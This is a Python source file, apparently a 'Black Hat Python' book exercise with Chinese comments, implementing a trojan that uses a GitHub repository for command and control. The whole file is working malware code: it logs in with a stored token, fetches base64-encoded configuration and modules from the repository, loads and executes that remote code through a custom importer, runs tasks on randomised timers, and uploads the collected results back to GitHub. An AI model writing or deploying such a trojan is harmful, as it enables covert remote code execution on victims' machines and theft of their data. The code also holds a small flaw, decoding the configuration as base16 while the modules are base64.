#!/usr/bin/env python
# encoding: utf-8
"""
@file: git_trojan.py
@time: 2022/5/25 11:47
@project: black-hat-python-2ed
@desc: P143 构建基于GitHub通信的木马
"""
import base64
import importlib.util
import json
import random
import sys
import threading
import time
from datetime import datetime

import github3


def github_connect():
    """
    读取在GitHub上创建的令牌
    :return:
    """
    with open('mytoken.txt') as f:
        token = f.read()
    user = "relph"
    sess = github3.login(token=token)
    return sess.repository(user, 'bhptrojan')


def get_file_contents(dirname, module_name, repo):
    """
    从远程仓库中抓取文件并读取里面的数据，返回相应模块的内容
    :param dirname:
    :param module_name:
    :param repo:
    :return:
    """
    return repo.file_contents(f"{dirname}/{module_name}").content


class Torjan:
    def __init__(self, id):
        self.id = id
        # 设定配置文件和数据目录路径
        self.config_file = f"{id}.json"
        self.data_path = f"data/{id}/"
        # 连接GitHub仓库
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b16decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                # 通过调用exec函数将模块内容引入木马对象
                exec("import %s" % task['module'])
        return config

    def module_run(self, module):
        # 调用模块中的run函数
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        """
        创建一个文件，包含当前日期和时间，并将模块的输出结果存入文件
        :param data:
        :return:
        """
        message = datetime.now().isoformat()
        remote_path = f"data/{self.id}/{message}.data"
        bindata = bytes("%r" % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))

    def run(self):
        while True:
            # 读取配置文件
            config = self.get_config()
            for task in config:
                # 执行模块的run函数
                thread = threading.Thread(target=self.module_run, args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30 * 30, 3 * 60 * 60))


class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()

        # 从仓库中查找这个文
        new_library = get_file_contents('module', f'{name}.py', self.repo)
        if new_library is not None:
            # 进行base64解码
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        # 创建空白的模块对象
        new_module = importlib.util.module_from_spec(spec)
        # 把github中拉取的代码填入
        exec(self.current_module_code, new_module.__dict__)
        # 将新创建的模块插入到sys.modules列表
        sys.modules[spec.name] = new_module
        return new_module
